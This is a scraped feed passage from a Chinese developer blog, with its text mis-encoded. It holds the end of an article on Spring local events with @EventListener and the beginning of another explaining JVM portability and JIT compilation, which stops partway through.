<p>ç”¨EventListeneræ³¨è§£å°±å¯ä»¥äº†ã€‚</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@Component</span>
<span class="hljs-variable">@Slf4j</span>
<span class="hljs-variable">@RequiredArgsConstructor</span>
class NewShopRuleGenerateListener {

    <span class="hljs-variable">@EventListener</span>
    public void <span class="hljs-built_in">onShopCreationEvent</span>(ShopCreationEvent event) {
        <span class="hljs-selector-tag">log</span><span class="hljs-selector-class">.info</span>(<span class="hljs-string">"NewShopRuleGenerateListener received : {}"</span>, JSON.<span class="hljs-built_in">toJSONString</span>(event));
        <span class="hljs-selector-tag">Long</span> <span class="hljs-selector-tag">shopId</span> = <span class="hljs-selector-tag">event</span><span class="hljs-selector-class">.getShopId</span>();
        <span class="hljs-selector-tag">if</span> (shopId == null) {
            <span class="hljs-selector-tag">return</span>;
        }
        <span class="hljs-comment">// æ–°å¯ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œï¼Œé¿å…é˜»å¡äº‹ä»¶å‘å¸ƒçº¿ç¨‹</span>
        <span class="hljs-selector-tag">new</span> <span class="hljs-selector-tag">Thread</span>(() -&gt; {
            <span class="hljs-selector-tag">ShopInfoAggregateRoot</span> <span class="hljs-selector-tag">shopInfoAggregateRoot</span> = <span class="hljs-selector-tag">shopInfoRepository</span><span class="hljs-selector-class">.selectByShopId</span>(shopId.<span class="hljs-built_in">intValue</span>());
           
            <span class="hljs-comment">// æ–°å¢çš„é—¨åº—é…ç½®å„ç§å„æ ·çš„è§„åˆ™</span>
            
        })<span class="hljs-selector-class">.start</span>();
    }
</code></pre>
<p>å¯ä»¥çœ‹å‡ºï¼š</p>
<ul>
<li><strong>ç›‘å¬æ–¹å¼éå¸¸ç›´è§‚</strong>ï¼šé€šè¿‡Â <code>@EventListener</code>Â æ ‡æ³¨æ–¹æ³•ï¼Œå‚æ•°å°±æ˜¯è¦ç›‘å¬çš„äº‹ä»¶ç±»å‹Â <code>ShopCreationEvent</code></li>
<li><strong>ä¸šåŠ¡é€»è¾‘å®Œå…¨ä»</strong>ShopApplicationService<strong>ä¸­æ‹†äº†å‡ºæ¥</strong>ï¼Œè½¬ç§»åˆ°ä¸€ä¸ªèŒè´£æ¸…æ™°çš„ç›‘å¬å™¨ç±»é‡Œ</li>
<li><strong>ä¸ºé¿å…é˜»å¡äº‹ä»¶å‘å¸ƒçº¿ç¨‹ï¼Œ</strong> ç›‘å¬å™¨å†…éƒ¨ä¸»åŠ¨ä½¿ç”¨æ–°çº¿ç¨‹æ‰§è¡Œè€—æ—¶æ“ä½œ</li>
</ul>
<p>è¿™æ¡é“¾è·¯çš„å¥½å¤„åœ¨äºï¼š</p>
<ul>
<li>
<p>ä¿å­˜é—¨åº—çš„ä¸»æµç¨‹å¯¹â€œè°åœ¨ç›‘å¬è¿™ä¸ªäº‹ä»¶â€æ˜¯æ— æ„ŸçŸ¥çš„ï¼›</p>
</li>
<li>
<p>æ–°å¢æˆ–åˆ é™¤ç›‘å¬å™¨åªå½±å“ç›‘å¬æ–¹ä»£ç ï¼Œä¸éœ€è¦ä¿®æ”¹Â <code>ShopApplicationService</code>Â ï¼›</p>
</li>
</ul>
<h2 data-id="heading-2"><strong>å®æˆ˜è½åœ°å»ºè®®</strong></h2>
<p><strong>å°½é‡ä¸ºæ¯ç±»äº‹ä»¶æä¾›å•ç‹¬çš„å‘å¸ƒå™¨</strong></p>
<ul>
<li>æ¯”å¦‚Â <code>ShopCreationEventPublisher</code>ã€<code>ShopUpdatePublisher</code>ï¼Œè€Œä¸æ˜¯åœ¨ä¸šåŠ¡ä»£ç é‡Œç›´æ¥æ‹¿Â <code>ApplicationEventPublisher</code></li>
<li>ä¾¿äºåç»­åœ¨å‘å¸ƒå™¨å±‚é¢ç»Ÿä¸€åšæ—¥å¿—ã€é™æµæˆ–åŸ‹ç‚¹</li>
</ul>
<p><strong>äº‹ä»¶å‘½åå’Œå­—æ®µä¿æŒä¸šåŠ¡è¯­ä¹‰æ¸…æ™°</strong></p>
<ul>
<li><code>ShopCreationEvent</code>Â è¿™ç§åç§°æ¯”â€œé—¨åº—å˜æ›´äº‹ä»¶â€æ›´å…·ä½“</li>
<li>äº‹ä»¶ä½“åªæ”¾å¿…è¦å­—æ®µï¼Œæ¯”å¦‚Â <code>shopId</code>ã€äº‹ä»¶ç±»å‹ codeï¼Œé¿å…å˜æˆâ€œå¤§è€Œå…¨ DTO`</li>
</ul>
<p><strong>ç›‘å¬å™¨èŒè´£è¦å•ä¸€</strong></p>
<ul>
<li>ä¸€ä¸ªç›‘å¬å™¨ä¸“æ³¨åšä¸€ä»¶äº‹æƒ…</li>
<li>å¦‚æœåç»­è¿˜æœ‰â€œæ–°é—¨åº—åˆå§‹åŒ–åº“å­˜â€ã€â€œæ–°é—¨åº—æ¨é€æ¶ˆæ¯â€ç­‰ï¼Œå¯ä»¥æ–°å»ºç›‘å¬å™¨æŒ‰èŒè´£æ‹†åˆ†</li>
</ul>
<p><strong>å¼‚æ­¥å¤„ç†å°½æ—©æŠ½è±¡åˆ°ç»Ÿä¸€æœºåˆ¶</strong></p>
<ul>
<li>ç›®å‰ä¸Šé¢çš„ä»£ç ä½¿ç”¨Â <code>new Thread</code>ã€‚è¿™ä¸ªæ˜¯ä¸å¤ªåˆç†çš„ï¼Œ åº”è¯¥æ˜¯ç”¨çº¿ç¨‹æ± ã€‚</li>
</ul>
<p>åœ¨ä¸å¼•å…¥ MQ çš„å‰æä¸‹ï¼ŒåŸºäº ApplicationEventPublisher çš„è¿™ç§æœ¬åœ°äº‹ä»¶æœºåˆ¶ï¼Œå¯ä»¥åœ¨ä¿æŒä»£ç ç»“æ„æ¸…æ™°çš„åŒæ—¶ï¼Œç»™ç³»ç»Ÿé¢„ç•™è¶³å¤Ÿçš„æ‰©å±•ç‚¹ï¼Œå¯¹å¾ˆå¤šä¸­å°ä½“é‡çš„ä¸šåŠ¡æ¥è¯´ï¼Œè¿™ç§æ–¹æ¡ˆå·²ç»è¶³å¤Ÿå®ç”¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JVM ä¸ºä»€ä¹ˆèƒ½è·¨å¹³å°ï¼ŸJIT å‡­ä»€ä¹ˆâ€œè¶Šè·‘è¶Šå¿«â€ï¼Ÿâ€”â€”ç”¨å‡ ä¸ªä¾‹å­æŠŠæ ¸å¿ƒè®²é€]]></title>    <link>https://juejin.cn/post/7597764707035398195</link>    <guid>https://juejin.cn/post/7597764707035398195</guid>    <pubDate>2026-01-22T06:22:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597764707035398195" data-draft-id="7597989474971861042" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JVM ä¸ºä»€ä¹ˆèƒ½è·¨å¹³å°ï¼ŸJIT å‡­ä»€ä¹ˆâ€œè¶Šè·‘è¶Šå¿«â€ï¼Ÿâ€”â€”ç”¨å‡ ä¸ªä¾‹å­æŠŠæ ¸å¿ƒè®²é€"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-22T06:22:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é©¬å¡å·´å¡"/> <meta itemprop="url" content="https://juejin.cn/user/1892677617451163"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JVM ä¸ºä»€ä¹ˆèƒ½è·¨å¹³å°ï¼ŸJIT å‡­ä»€ä¹ˆâ€œè¶Šè·‘è¶Šå¿«â€ï¼Ÿâ€”â€”ç”¨å‡ ä¸ªä¾‹å­æŠŠæ ¸å¿ƒè®²é€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1892677617451163/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é©¬å¡å·´å¡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T06:22:43.000Z" title="Thu Jan 22 2026 06:22:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>å¼•å­ï¼šä¸ºä»€ä¹ˆä¸ç›´æ¥æŒ‰å¹³å°ç¼–æœºå™¨ç ï¼Ÿ</strong></p>
<p>å¾ˆå¤šäººï¼ˆåŒ…æ‹¬å½“å¹´çš„æˆ‘ï¼‰åœ¨åˆå­¦ Java æ—¶éƒ½æœ‰ä¸ªç›´è§‰ä¸Šçš„ç–‘æƒ‘ï¼š</p>
<blockquote>
<p>â€œä¸ºä»€ä¹ˆ Java éè¦å¼„ä¸ªÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269126699%26content_type%3DArticle%26match_order%3D1%26q%3DJVM%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269126699&amp;content_type=Article&amp;match_order=1&amp;q=JVM&amp;zhida_source=entity" ref="nofollow noopener noreferrer">JVM</a>Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269126699%26content_type%3DArticle%26match_order%3D1%26q%3D%25E8%2599%259A%25E6%258B%259F%25E6%259C%25BA%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269126699&amp;content_type=Article&amp;match_order=1&amp;q=%E8%99%9A%E6%8B%9F%E6%9C%BA&amp;zhida_source=entity" ref="nofollow noopener noreferrer">è™šæ‹Ÿæœº</a>ï¼Ÿå¤šäº†ä¸€å±‚ä¸­é—´å±‚ï¼Œè‚¯å®šæ¯”ç›´æ¥è·‘æœºå™¨ç æ…¢å•Šï¼æ—¢ç„¶è¦è·¨å¹³å°ï¼Œæˆ‘ç›´æ¥åƒ C++ é‚£æ ·ï¼Œç»™ Windows ç¼–ä¸ª .exeï¼Œç»™ Linux ç¼–ä¸ª ELFï¼Œä¸ä¹Ÿä¸€æ ·èƒ½è·‘å—ï¼Ÿâ€</p>
</blockquote>
<p>è¿™ä¸ªç›´è§‰å¾ˆæ­£å¸¸ï¼Œä½†å®ƒå¿½ç•¥äº†è½¯ä»¶å·¥ç¨‹ä¸­ä¸¤ä¸ªæœ€å¤´ç–¼çš„é—®é¢˜ï¼š<strong>äº¤ä»˜æˆæœ¬</strong>Â å’ŒÂ <strong>è¿è¡Œæ—¶ä¼˜åŒ–çš„ä¸Šé™</strong>ã€‚</p>
<p>Java è®¾è®¡è¿™å¥—â€œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269126699%26content_type%3DArticle%26match_order%3D1%26q%3D%25E5%25AD%2597%25E8%258A%2582%25E7%25A0%2581%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269126699&amp;content_type=Article&amp;match_order=1&amp;q=%E5%AD%97%E8%8A%82%E7%A0%81&amp;zhida_source=entity" ref="nofollow noopener noreferrer">å­—èŠ‚ç </a>Â + è™šæ‹Ÿæœºâ€çš„ä½“ç³»ï¼ŒçœŸæ­£æƒ³è§£å†³çš„å¹¶ä¸æ˜¯â€œèƒ½ä¸èƒ½è·‘â€ï¼Œè€Œæ˜¯ï¼š<strong>èƒ½ä¸èƒ½ç”¨åŒä¸€ä»½äº¤ä»˜ç‰©ï¼Œåœ¨ä¸åŒå¹³å°ä¸Šä¿æŒä¸€è‡´è¯­ä¹‰ï¼Œå¹¶åœ¨è¿è¡Œæ—¶æ‹¿åˆ°è¶³å¤Ÿä¿¡æ¯æŠŠæ€§èƒ½æ‹‰å›æ¥ã€‚</strong></p>
<p>ä»Šå¤©æˆ‘ä»¬å°±æŠ›å¼€é‚£äº›æ™¦æ¶©çš„ JVM è§„èŒƒï¼Œç”¨ä¸‰ä¸ªæœ€å…³é”®çš„é—®é¢˜ï¼Œé…åˆä»£ç å®ä¾‹ï¼ŒæŠŠÂ <strong>è·¨å¹³å°ã€JITï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269126699%26content_type%3DArticle%26match_order%3D1%26q%3D%25E5%258D%25B3%25E6%2597%25B6%25E7%25BC%2596%25E8%25AF%2591%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269126699&amp;content_type=Article&amp;match_order=1&amp;q=%E5%8D%B3%E6%97%B6%E7%BC%96%E8%AF%91&amp;zhida_source=entity" ref="nofollow noopener noreferrer">å³æ—¶ç¼–è¯‘</a>ï¼‰ã€AOTï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269126699%26content_type%3DArticle%26match_order%3D1%26q%3D%25E6%258F%2590%25E5%2589%258D%25E7%25BC%2596%25E8%25AF%2591%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269126699&amp;content_type=Article&amp;match_order=1&amp;q=%E6%8F%90%E5%89%8D%E7%BC%96%E8%AF%91&amp;zhida_source=entity" ref="nofollow noopener noreferrer">æå‰ç¼–è¯‘</a>ï¼‰</strong> Â çš„æ ¸å¿ƒé€»è¾‘è®²é€ã€‚</p>
<hr/>
<h3 data-id="heading-0">â‘  JVM è·¨å¹³å°ï¼šè·¨çš„åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p>æˆ‘ä»¬å¸¸æŒ‚åœ¨å˜´è¾¹çš„â€œä¸€æ¬¡ç¼–å†™ï¼Œåˆ°å¤„è¿è¡Œï¼ˆWrite Once, Run Anywhereï¼‰â€ï¼Œå¾ˆå¤šäººç†è§£åäº†ã€‚å®ƒæŒ‡çš„ä¸æ˜¯æºç å±‚é¢çš„å¯ç§»æ¤ï¼Œè€Œæ˜¯Â <strong>äºŒè¿›åˆ¶å±‚é¢çš„å¯ç§»æ¤</strong>ã€‚</p>
<h3 data-id="heading-1">1.1 æºç å¯ç§»æ¤ vs äºŒè¿›åˆ¶å¯ç§»æ¤</h3>
<p>C++ æ˜¯å…¸å‹çš„â€œæºç å¯ç§»æ¤â€ã€‚ä½ å†™ä¸€ä»½ä»£ç ï¼Œåœ¨ Windows ä¸Šç”¨ MSVC ç¼–è¯‘ï¼Œåœ¨ Linux ä¸Šç”¨ GCC ç¼–è¯‘ã€‚è™½ç„¶æºç ä¸€æ ·ï¼Œä½†ç¼–è¯‘å‡ºæ¥çš„äº§ç‰©æ˜¯ä¸¤ç äº‹ã€‚</p>
<p>Java èµ°çš„æ˜¯Â <strong>äºŒè¿›åˆ¶å¯ç§»æ¤</strong>Â è·¯çº¿ã€‚javac ç¼–è¯‘å™¨ç”Ÿæˆçš„Â <code>.class</code>Â æ–‡ä»¶æˆ–Â <code>.jar</code>Â åŒ…ï¼Œæ˜¯ä¸€ç§<strong>ä¸ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿæ— å…³çš„ä¸­é—´æ ¼å¼</strong>ã€‚ è¿™æ„å‘³ç€ï¼Œä½ ç¼–è¯‘å¥½çš„è¿™ä¸ª jar åŒ…ï¼Œæ—¢ä¸éœ€è¦å…³å¿ƒä¸ä»…ä¸éœ€è¦å…³å¿ƒæ˜¯è·‘åœ¨ x86 è¿˜æ˜¯ ARM ä¸Šï¼Œä¹Ÿä¸éœ€è¦å…³å¿ƒåº•ä¸‹æ˜¯ Linux è¿˜æ˜¯ Windowsã€‚</p>
<h3 data-id="heading-2">1.2 JVM æ˜¯ä½ çš„â€œç³»ç»Ÿä»£ç†äººâ€</h3>
<p>é‚£ä¹ˆï¼Œè°æ¥å¤„ç†å·®å¼‚ï¼Ÿ<strong>JVM</strong>ã€‚ ä½ å¯ä»¥æŠŠ JVM æƒ³è±¡æˆä¸€ä¸ªç¿»è¯‘å®˜ï¼Œå®ƒå±è”½äº†åº•å±‚æ“ä½œç³»ç»Ÿçš„Â <strong>çº¿ç¨‹æ¨¡å‹ã€å†…å­˜ç®¡ç†ã€IO æ¨¡å‹ã€ABIï¼ˆåº”ç”¨ç¨‹åºäºŒè¿›åˆ¶æ¥å£ï¼‰</strong> Â ç­‰å·®å¼‚ã€‚</p>
<p><strong>æ¥çœ‹ä¸€ä¸ªæœ€ç»å…¸çš„ä¾‹å­ï¼š<code>new Thread()</code></strong></p>
<p>æˆ‘ä»¬åœ¨ Java é‡Œå¯åŠ¨ä¸€ä¸ªçº¿ç¨‹ï¼Œé€šå¸¸åªéœ€è¦ä¸¤è¡Œä»£ç ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">new <span class="hljs-built_in">Thread</span>(() -&gt; {
    System<span class="hljs-selector-class">.out</span><span class="hljs-selector-class">.println</span>(ã€ŒHello from thread!ã€);
})<span class="hljs-selector-class">.start</span>();
</code></pre>
<p>ä½œä¸ºå¼€å‘è€…ï¼Œä½ <strong>ä¸éœ€è¦</strong>çŸ¥é“ï¼š</p>
<ul>
<li>Linux ä¸Šæ˜¯ç”¨Â <code>pthread</code>Â åº“è¿˜æ˜¯Â <code>clone</code>Â ç³»ç»Ÿè°ƒç”¨ï¼Ÿ</li>
<li>Windows ä¸Šæ˜¯ç”¨Â <code>CreateThread</code>Â è¿˜æ˜¯Â <code>_beginthreadex</code>ï¼Ÿ</li>
<li>ä¸åŒæ¶æ„ä¸‹ï¼Œæ ˆç©ºé—´æ€ä¹ˆåˆ†é…ï¼Ÿçº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼ˆTLSï¼‰æ€ä¹ˆå¤„ç†ï¼Ÿ</li>
</ul>
<p>è¿™äº›è„æ´»ç´¯æ´»ï¼Œå…¨è¢« JVM çš„ä¸åŒå¹³å°å®ç°ç‰ˆæœ¬ï¼ˆWindows ç‰ˆ JDKã€Linux ç‰ˆ JDKï¼‰é»˜é»˜æ‰›ä¸‹äº†ã€‚è¿™å°±æ˜¯ JVM å­˜åœ¨çš„æœ€å¤§å·¥ç¨‹æ„ä¹‰ï¼š<strong>å®ƒè®©åº”ç”¨å±‚çœ‹åˆ°çš„ï¼Œæ˜¯ä¸€ä¸ªç»Ÿä¸€çš„ã€æ ‡å‡†çš„è¿è¡Œæ—¶ç¯å¢ƒã€‚</strong></p>
<h3 data-id="heading-3">â‘¡ ä¸ºä»€ä¹ˆä¸èµ°â€œå¤šäº§ç‰©â€è·¯çº¿ï¼Ÿ</h3>
<p>å›åˆ°å¼€å¤´çš„é—®é¢˜ï¼šâ€œæˆ‘å‹¤å¿«ç‚¹ï¼Œç»™æ¯ä¸ªå¹³å°åˆ†åˆ«ç¼–è¯‘ä¸€ä¸ªç‰ˆæœ¬ä¸è¡Œå—ï¼Ÿâ€</p>
<p>è¡Œï¼Œä½†ä»£ä»·æ˜¯å·¨å¤§çš„ã€‚è¿™æœ¬è´¨ä¸Šæ˜¯åœ¨æŠŠÂ <strong>JVM è¯¥åšçš„äº‹ï¼Œä¸‹æ”¾åˆ°äº†ä½ çš„é¡¹ç›®é‡Œ</strong>ã€‚</p>
<h3 data-id="heading-4">2.1 äº¤ä»˜ä¸æµ‹è¯•çŸ©é˜µçš„å™©æ¢¦</h3>
<p>å‡è®¾ä½ çš„å…¬å¸å¼€å‘ä¸€æ¬¾è½¯ä»¶ï¼Œéœ€è¦æ”¯æŒ Windowsã€Linuxã€macOSï¼ŒåŒæ—¶è¿˜è¦å…¼é¡¾ x86_64 å’Œ ARM64 æ¶æ„ã€‚</p>
<ul>
<li><strong>å¦‚æœæ˜¯ C/C++ æ¨¡å¼ï¼ˆå¤šäº§ç‰©ï¼‰ï¼š</strong> Â ä½ éœ€è¦ç»´æŠ¤ä¸€ä¸ªåºå¤§çš„äº§ç‰©çŸ©é˜µï¼š<code>win-x64</code>ã€<code>Linux-x64</code>ã€<code>Linux-arm64</code>ã€<code>mac-arm64</code>â€¦ æ¯æ¬¡å‘ç‰ˆï¼ŒCI/CD æµæ°´çº¿è¦è·‘ N éï¼›æ¯æ¬¡ä¿® Bugï¼Œè¦éªŒè¯æ˜¯ä¸æ˜¯åªåœ¨æŸä¸ªç‰¹å®šæ¶æ„ä¸‹æ‰å´©æºƒï¼›è¿˜è¦å¤„ç†ä¸åŒç³»ç»Ÿçš„ä¾èµ–åº“ç‰ˆæœ¬å†²çªã€‚</li>
<li><strong>å¦‚æœæ˜¯ Java æ¨¡å¼ï¼ˆå•ä¸€äº§ç‰©ï¼‰ï¼š</strong> Â ä½ åªéœ€è¦äº¤ä»˜ä¸€ä¸ªÂ <code>app.jar</code>ã€‚ è¿ç»´åªéœ€è¦åœ¨ç›®æ ‡æœºå™¨ä¸Šå®‰è£…å¯¹åº”ç‰ˆæœ¬çš„ JVMã€‚åªè¦ JVM ç¬¦åˆè§„èŒƒï¼Œä½ çš„ jar åŒ…å°±èƒ½è·‘å‡ºä¸€è‡´çš„æ•ˆæœã€‚</li>
</ul>
<p><strong>æ€»ç»“å°±æ˜¯ï¼š</strong> Â Java é€‰æ‹©æŠŠå¤æ‚åº¦é›†ä¸­åœ¨Â <strong>JVM å’Œæ ‡å‡†åº“</strong>Â è¿™ä¸€å±‚ï¼Œä»è€Œè§£æ”¾äº†åƒåƒä¸‡ä¸‡çš„åº”ç”¨å±‚å¼€å‘è€…ã€‚ä½ å½“ç„¶å¯ä»¥è¯´â€œæˆ‘æ„¿æ„ç»´æŠ¤å¤šå¹³å°äº§ç‰©â€ï¼Œä½†ä½ åšå¾—è¶Šå¤šï¼Œå°±è¶Šæ¥è¿‘ C++ çš„å·¥ç¨‹ä»£ä»·ï¼ŒèƒŒç¦»äº† Java çš„åˆè¡·ã€‚</p>
<h3 data-id="heading-5">â‘¢ JITï¼šä¸ºä»€ä¹ˆä»£ç ä¼šâ€œè¶Šè·‘è¶Šå¿«â€ï¼Ÿ</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c4ad43903c164e8fb500bda0254591a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ams5Y2h5be05Y2h:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769667763&amp;x-signature=LPIZ7ljTlBvjfeNgoRldb7fzK%2B8%3D" alt="" loading="lazy"/></p>
<p>è¿™æ˜¯ Java æœ€è¢«è¯¯è§£ï¼Œä¹Ÿæœ€â€œé»‘ç§‘æŠ€â€çš„åœ°æ–¹ã€‚ å¾ˆå¤šäººä»¥ä¸º JITï¼ˆJust-In-Time Compilerï¼‰åªæ˜¯æŠŠå­—èŠ‚ç ç¿»è¯‘æˆæœºå™¨ç ï¼Œçœå»äº†â€œè§£é‡Šæ‰§è¡Œâ€çš„å¼€é”€ã€‚Â <strong>é”™ï¼JIT çœŸæ­£çš„æ€æ‰‹é”æ˜¯ï¼šè¿è¡Œæ—¶ç”»åƒï¼ˆProfileï¼‰é©±åŠ¨çš„æŠ•æœºä¼˜åŒ–ã€‚</strong></p>
<h3 data-id="heading-6">3.1 åˆ†å±‚ç¼–è¯‘ï¼šå…ˆè·‘èµ·æ¥ï¼Œå†å˜å¿«</h3>
<p>HotSpot è™šæ‹Ÿæœºé‡‡ç”¨çš„æ˜¯Â <strong>åˆ†å±‚ç¼–è¯‘ï¼ˆTiered Compilationï¼‰</strong> Â ç­–ç•¥ï¼š</p>
<ol>
